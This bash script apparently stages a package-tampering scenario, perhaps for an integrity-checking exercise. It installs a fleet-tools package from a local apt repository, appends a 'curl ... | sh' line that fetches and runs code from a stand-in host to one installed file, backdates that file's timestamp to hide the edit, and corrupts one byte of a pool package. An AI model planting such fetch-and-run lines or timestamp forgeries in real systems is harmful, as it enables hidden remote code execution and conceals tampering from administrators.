#!/usr/bin/env bash
# Runs inside the control plane node container after the repository was
# copied to /var/lib/fleet-apt. Installs fleet-tools from it with dpkg, then
# changes one installed file of fleet-tools and one byte of one package file
# in the pool, both chosen at random. The signed Release and Packages files
# stay as published.
set -euo pipefail
repository=/var/lib/fleet-apt
flip_byte() {
  local file="$1" size offset original
  size=$(stat -c %s "$file")
  offset=$(( size / 2 + (RANDOM % (size / 4)) ))
  original=$(od -An -tu1 -j "$offset" -N1 "$file" | tr -d ' ')
  printf "$(printf '\\%03o' $(( original ^ 255 )))" | dd of="$file" bs=1 seek="$offset" count=1 conv=notrunc status=none
}
dpkg --purge fleet-tools >/dev/null 2>&1 || true
dpkg -i "$repository"/pool/fleet-tools_*_all.deb >/dev/null
changed_file=$(dpkg -L fleet-tools | grep '^/usr/lib/fleet-tools/.' | shuf -n 1)
printf 'curl -s http://198.51.100.7/stage2 | sh\n' >> "$changed_file"
touch -r "$repository/Release" "$changed_file"
damaged_package=$(find "$repository/pool" -name '*.deb' | shuf -n 1)
flip_byte "$damaged_package"
touch -r "$repository/Release" "$damaged_package"
echo "Staged $repository and installed fleet-tools"
